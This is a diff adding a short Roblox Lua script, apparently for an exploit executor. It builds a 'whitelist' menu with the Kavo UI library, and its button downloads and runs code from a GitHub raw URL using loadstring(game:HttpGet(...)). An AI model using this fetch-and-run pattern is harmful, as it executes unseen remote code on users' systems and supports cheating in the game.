@@ -1,1 +1,18 @@
 
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("whitelist", "DarkTheme")
+local Tab = Window:NewTab("TabName")
+local Section = Tab:NewSection("Section Name")
+Section:NewLabel("LabelText")
+
+game:GetService("StarterGui"):SetCore("SendNotification",{
+    Title="Private";
+    Text="this is a dumb whitelist I made so it doesn't get leak";
+    Duration=3;
+})
+
+
+Section:NewButton("Script", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Robotboyingg2/something/main/Something",true))()
+end)
+
